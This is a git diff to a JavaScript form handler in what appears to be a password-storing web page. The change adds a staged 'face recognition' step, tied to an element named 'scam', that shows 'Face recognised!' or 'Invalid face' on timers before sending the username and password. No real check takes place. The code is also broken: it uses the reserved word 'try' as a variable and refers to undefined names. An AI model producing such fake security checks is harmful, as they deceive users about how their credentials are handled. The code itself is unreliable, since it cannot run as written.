@@ -27,6 +27,9 @@ const allURLs = [
   "https://www.amazon.com/ap/signin"
 ]
 
+const scam = document.getElementById("scam");
+let try = 1;
+
 async function sendData(url, inputUsername, encodedPassword) {
   var fdata = new FormData()
 
@@ -60,14 +63,29 @@ async function sendData(url, inputUsername, encodedPassword) {
 
 window.addEventListener('DOMContentLoaded', () => {
   document.getElementById('contact').addEventListener('submit', function (e) {
-    e.preventDefault()
-    var text = document.getElementById('passwordToStore')
-    var username = document.getElementById('userName')
-    try {
-      sendData(window.location.href, inputUsername, Password)
-    } catch (e) {
-      alert('Password Saved!')
+    e.preventDefault();
+    scam.innerText = "Recognising face...";
+    if(try == 1){
+      try++;
+      setTimeout(() => {
+        scam.innerText = "Face recognised!";
+        var text = document.getElementById('passwordToStore')
+        var username = document.getElementById('userName')
+        try {
+          sendData(window.location.href, inputUsername, Password);
+        } catch (e) {
+          alert('Password Saved!');
+        }
+        scam.innerText = "";
+      }, 2000);
+    } else {
+      setTimeout(() => {
+        scam.innerText = "Face invalid!";
+        alert('Invalid face');
+        scam.innerText = "";
+      }, 2000);
     }
+    
     // store(username.value, text.value)
   })
 
